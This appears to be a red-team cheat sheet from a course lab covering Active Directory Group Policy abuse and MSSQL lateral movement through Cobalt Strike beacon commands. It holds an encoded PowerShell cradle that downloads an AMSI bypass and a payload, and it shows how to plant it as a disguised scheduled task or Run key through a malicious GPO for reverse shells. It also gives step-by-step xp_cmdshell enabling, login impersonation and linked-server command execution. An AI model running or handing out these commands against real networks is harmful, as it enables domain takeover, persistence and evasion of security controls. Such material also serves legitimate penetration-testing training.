beacon&gt; ls \\web.dev.cyberbotic.io\c$
</code></pre></div><h3 id=group-policy>Group Policy</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>**<span style=color:#75715e># Modify Existing GPO**</span>

<span style=color:#75715e># 1. Identify GPO where current principal has modify rights</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainSID -Domain dev.cyberbotic.io
beacon&gt; powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CreateChild|WriteProperty</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.SecurityIdentifier <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}</span><span style=color:#e6db74>&#34;</span> }

<span style=color:#75715e># 2. Resolve GPOName, Path and SID of principal</span>
beacon&gt; powerpick Get-DomainGPO -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> | select displayName, gpcFileSysPath

beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Developers</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
beacon&gt; ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

<span style=color:#75715e># 3. Identify the domain OU where the above GPO applies</span>
beacon&gt; powerpick Get-DomainOU -GPLink <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{5059FAC1-5E94-4361-95D3-3BB235A23928}</span><span style=color:#e6db74>&#34;</span> | select distinguishedName

<span style=color:#75715e># 4. Identify the systems under the given OU</span>
beacon&gt; powerpick Get-DomainComputer -SearchBase <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>OU=Workstations,DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> | select dnsHostName

<span style=color:#75715e># 5. Setup a smb listener and download &amp; execute cradle pointing to port 80</span>
<span style=color:#75715e># Make sure to use AMSI Bypass with the powershell cradle.</span>
PS C:\&gt; $str = <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);</span><span style=color:#e6db74>&#34;</span>
PS C:\&gt; <span style=color:#66d9ef>[System.Convert]</span>::ToBase64String(<span style=color:#66d9ef>[System.Text.Encoding]</span>::Unicode.GetBytes($str))

powershell -w hidden -nop -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==

<span style=color:#75715e># 6. Enable inbound traffic on WebDrive by ports (8080) (requires system access)</span>
beacon&gt; powerpick New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Rule 1</span><span style=color:#e6db74>&#34;</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon&gt; powershell Remove-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Rule 1</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># 7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server </span>
beacon&gt; rportfwd 8080 127.0.0.1 80
beacon&gt; rportfwd stop 8080
beacon&gt; run netstat -anp tcp

<span style=color:#75715e># 8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system</span>
<span style=color:#75715e># iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);</span>
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Install Updates</span><span style=color:#e6db74>&#34;</span> --Author NT AUTHORITY\SYSTEM --Command <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\System32\cmd.exe</span><span style=color:#e6db74>&#34;</span> --Arguments <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>/c powershell -w hidden -nop -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==</span><span style=color:#e6db74>&#34;</span> --GPOName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Vulnerable GPO</span><span style=color:#e6db74>&#34;</span> --Force

<span style=color:#75715e># 9. Now as we are using smb listener , We have to manually link with each machine that were present in the OU where this GPO was applied.</span>
<span style=color:#75715e># Make sure to monitor the web log in cobalt strike for Payload Downloads, And connect to the Smb beacon.</span>
beacon&gt; link WKSTN-1 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57

<span style=color:#75715e># 10. Lastly, either we can wait for the GPO  to be applied or force update to get reverse shell</span>
cmd&gt; gpupdate /force

<span style=color:#75715e># 11. Cleaup</span>
beacon&gt; rportfwd stop 8080
beacon&gt; powershell Remove-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Rule 1</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e>#-------------------------------------------------------------------------------</span>
**<span style=color:#75715e># Create and Link new GPO**</span>

<span style=color:#75715e># 1. Check the rights to create a new GPO in Domain</span>
beacon&gt; powerpick Get-DomainObjectAcl -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> -ResolveGUIDs | ? { $_.ObjectAceType <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Group-Policy-Container</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.ActiveDirectoryRights <span style=color:#f92672>-contains</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CreateChild</span><span style=color:#e6db74>&#34;</span> } | % { ConvertFrom-SID $_.SecurityIdentifier }
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Developers</span><span style=color:#e6db74>&#34;</span> -Domain dev.cyberbotic.io -Recurse
<span style=color:#75715e># 2. Find the OU where any principal has &#34;Write gPlink Privilege&#34;</span>
beacon&gt; powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>GP-Link</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-and</span> $_.ActiveDirectoryRights <span style=color:#f92672>-match</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>WriteProperty</span><span style=color:#e6db74>&#34;</span> } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
beacon&gt; powerpick Get-DomainComputer -SearchBase <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>OU=Workstations,DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> | select dnsHostName

<span style=color:#75715e># 3. Verify if RSAT module is installed for GPO abuse</span>
beacon&gt; powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

<span style=color:#75715e># 4. Create a new GPO &amp; configure it to execute attacker binary via Registry loaded from shared location or Use Powershell cradle to download payload from CS server.</span>
beacon&gt; powerpick New-GPO -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Evil GPO</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># 4-a. Using Shared Location to upload payload</span>
beacon&gt; powerpick Find-DomainShare -CheckShareAccess
beacon&gt; cd \\dc-2\software
beacon&gt; upload C:\Payloads\pivot.exe

beacon&gt; powerpick Set-GPPrefRegistryValue -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Evil GPO</span><span style=color:#e6db74>&#34;</span> -Context Computer -Action Create -Key <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><span style=color:#e6db74>&#34;</span> -ValueName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Updater</span><span style=color:#e6db74>&#34;</span> -Value <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe</span><span style=color:#e6db74>&#34;</span> -Type ExpandString 
<span style=color:#75715e># NOTE: HKLM based autorun changes requires system reboot to take effect</span>

<span style=color:#75715e># 4-b. Or Use Powershell cradle to download payload from CS server.</span>
<span style=color:#75715e># download &amp; execute smb cradle pointing to pivot (80)</span>
<span style=color:#75715e># Make sure to use AMSI Bypass with the powershell cradle.</span>
PS C:\&gt; $str = <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);</span><span style=color:#e6db74>&#34;</span>
PS C:\&gt; <span style=color:#66d9ef>[System.Convert]</span>::ToBase64String(<span style=color:#66d9ef>[System.Text.Encoding]</span>::Unicode.GetBytes($str))
powershell -w hidden -nop -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==
<span style=color:#75715e># Enable inbound traffic on WebDrive by ports (8080) (requires system access)</span>
beacon&gt; powerpick New-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Rule 1</span><span style=color:#e6db74>&#34;</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
<span style=color:#75715e># Setup port forwarding rule to accept the Payload Download request locally and forward to our team server </span>
beacon&gt; rportfwd 8080 127.0.0.1 80
<span style=color:#75715e># Configure  GPO to use the powershell execute cradle.</span>
beacon&gt; powerpick Set-GPPrefRegistryValue -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Evil GPO</span><span style=color:#e6db74>&#34;</span> -Context Computer -Action Create -Key <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><span style=color:#e6db74>&#34;</span> -ValueName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Updater</span><span style=color:#e6db74>&#34;</span> -Value <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\System32\cmd.exe /c powershell -w hidden -nop -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==</span><span style=color:#e6db74>&#34;</span> -Type ExpandString

<span style=color:#75715e># 5. Link newly created GPO with OU</span>
beacon&gt; powerpick Get-GPO -Name <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Evil GPO</span><span style=color:#e6db74>&#34;</span> | New-GPLink -Target <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>OU=Workstations,DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># 6. Now as we are using smb listener , We have to manually link with each machine that were present in the OU where this GPO was applied.</span>
<span style=color:#75715e># Make sure to monitor the web log in cobalt strike for Payload Downloads, And connect to the Smb beacon.</span>
beacon&gt; link WKSTN-1 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57

<span style=color:#75715e># 7. Lastly, either we can wait for the GPO  to be applied or force update to get reverse shell</span>
cmd&gt; gpupdate /force

<span style=color:#75715e># 8. Cleaup</span>
beacon&gt; rportfwd stop 8080
beacon&gt; powershell Remove-NetFirewallRule -DisplayName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Rule 1</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><h3 id=mssql-servers>MSSQL Servers</h3><ul><li><p>MSSQL Server - Quick Commands</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># MSSQL Server - Cheatsheet</span>
<span style=color:#75715e># SQLRecon : https://github.com/skahwah/SQLRecon/wiki</span>
<span style=color:#75715e># PowerUpSQL : https://github.com/NetSPI/PowerUpSQL/wiki</span>
  
<span style=color:#75715e>#1 Look for MSSQL Server</span>
beacon&gt; powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon&gt; powerpick Get-SQLInstanceDomain
  
<span style=color:#75715e>#2 Check if we can access the MSSQL Server</span>
beacon&gt; powerpick Get-SQLConnectionTest -Instance sql-2.dev.cyberbotic.io | fl
beacon&gt; powerpick Get-SQLServerInfo -Instance sql-2.dev.cyberbotic.io 
beacon&gt; powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Accessible</span><span style=color:#e6db74>&#34;</span> } | Get-SQLServerInfo
  
<span style=color:#75715e>#3 Look for users/groups which have access to these servers and somehow get access to that user/group. Or Try Kerberoasting the MSSQL Server user.</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\Powerview.ps1
beacon&gt; powerpick Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
  
<span style=color:#75715e>#4 Try to run some common queries on sql servers</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@version</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@version</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#5 Check if we have sysadmin access , if yes then use it to enable xp_cmdhsell and execute commands.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:whoami
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:EnableXp
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:xpcmd /command<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>whoami</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#6 Check if xp_cmdshell in enabled, if enabled execute commands.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLQuery -Instance sql-2.dev.cyberbotic.io  -Query <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#7 Check if impersonation is allowed, if yes then impersonate the user.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:impersonate
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc
  
<span style=color:#75715e>#8 Check if impersonated user have sysadmin access. If yes then use it to enable xp_cmdshell, and then execute commands and get shell.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iEnableXp /i:DEV\mssql_svc
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iQuery /i:DEV\mssql_svc /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:ixpcmd /i:DEV\mssql_svc /command<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>whoami</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#9 Check if linked Servers are available.</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io
  
<span style=color:#75715e>#10 Check if we can execute queries on linked Server.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@version</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>select @@version</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#11 Check if xp_cmdshell is enabled on linked server. If yes then execute command using RPC.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;&#39;xp_cmdshell&#39;&#39;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC(&#39;exec master..xp_cmdshell &#39;&#39;ipconfig&#39;&#39;&#39;) AT [sql-1.cyberbotic.io]</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC(&#39;exec master..xp_cmdshell &#39;&#39;ping -n 1 10.10.123.102&#39;&#39;&#39;) AT [sql-1.cyberbotic.io]</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#12 Check if rpc_out is enabled (Not default configuration) on each links,  and also we have sysadmin access on linked server.</span>
<span style=color:#75715e># Links are configured from source -&gt; destination. so the source has control over the link.</span>
<span style=color:#75715e># So basically we only need (for A linked to B)</span>
<span style=color:#75715e># 1) Sysadmin access on target link server (on B)</span>
<span style=color:#75715e># 2) rpc_out enabled on link (A to B) OR sysadmin access on prior server (A) for successfully enabling xp_cmdshell</span>
  
<span style=color:#75715e>#12-a Check RPC_Out enabled or not (For a link between SQL-2 to SQL-1 we have to check RPC settings in SQL-2 for SQL-1, )</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT name, is_rpc_out_enabled FROM sys.servers;</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#12-b If rpc_out is not enabled , Check if the Source server ( for A--&gt;B , Source is A) has sysadmin access or we can perform impersonation. After getting sysadmin access we can enable rpc_out for the link.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:impersonate
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC sp_serveroption &#39;sql-1.cyberbotic.io&#39;, &#39;rpc out&#39;, &#39;true&#39;;</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC sp_serveroption &#39;sql-1.cyberbotic.io&#39;, &#39;rpc&#39;, &#39;true&#39;;</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#12-c Check sysadmin access enabled or not.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><span style=color:#e6db74>&#34;</span>
beacon&gt; powerpick Get-SQLServerLinkCrawl -Instance sql-2.dev.cyberbotic.io
<span style=color:#75715e>#12-d If both rpc_out and sysadmin access is enabled , then enable xp_cmdshell.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC(&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;) AT [sql-1.cyberbotic.io]</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC(&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure;&#39;) AT [sql-1.cyberbotic.io]</span><span style=color:#e6db74>&#34;</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT value FROM sys.configurations WHERE name = &#39;&#39;xp_cmdshell&#39;&#39;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e>#12-e Execute Commands using xp_cmdshell.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /m:query /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXEC(&#39;exec master..xp_cmdshell &#39;&#39;ipconfig&#39;&#39;&#39;) AT [sql-1.cyberbotic.io]</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e>#13 Check if impersonation is allowed on linked Servers. If yes then impersonate the user and check for xp_cmdshell and sysadmin access, and if sysadmin is enabled then we can also enable xp_cmdshell to get code execution.</span>
<span style=color:#75715e># Query will return the IDs, So we have to convert them to principals.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT * FROM sys.server_permissions WHERE permission_name = &#39;&#39;IMPERSONATE&#39;&#39;;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Converting IDs to principal names</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Impersonate the user</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXECUTE AS login = &#39;&#39;DEV\mssql_svc&#39;&#39; ; SELECT SYSTEM_USER;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e>#Check for sysadmin access.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXECUTE AS login = &#39;&#39;DEV\mssql_svc&#39;&#39; ; SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;);</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Check for rpc_out enabled or not.</span>
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>SELECT name, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># If both sysadmin access is available and rpc_out is enabled,we can execute commands.</span>
beacon&gt; execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io /l:sql-1.cyberbotic.io /m:lquery /c:<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>EXECUTE AS login = &#39;&#39;DEV\mssql_svc&#39;&#39; ; exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>#14 After getting shell access to any MSSQL Server , Check if it runs under the default NT Service\MSSQLSERVER , by using getuid command.</span>
beacon&gt; getuid
beacon&gt; shell whoami /priv
